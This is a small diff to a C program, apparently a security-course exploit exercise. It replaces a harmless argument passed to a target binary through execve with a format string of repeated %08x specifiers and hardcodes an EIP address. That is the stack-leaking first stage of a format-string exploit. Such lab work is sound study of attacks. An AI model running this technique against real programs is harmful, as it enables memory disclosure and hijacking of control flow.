@@ -9,11 +9,14 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
-  char *env[] = { NULL };
+	// By inspection, we find the EIP address to be:
+	int EIP_ADDRESS = 0xbffffe70;
+	char sploitstring[] = "%08x %08x %08x %08x %08x\n";
+	char *args[] = { TARGET, sploitstring, NULL };
+	char *env[] = { NULL };
 
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+	execve(TARGET, args, env);
+	fprintf(stderr, "execve failed.\n");
 
-  return 0;
+	return 0;
 }
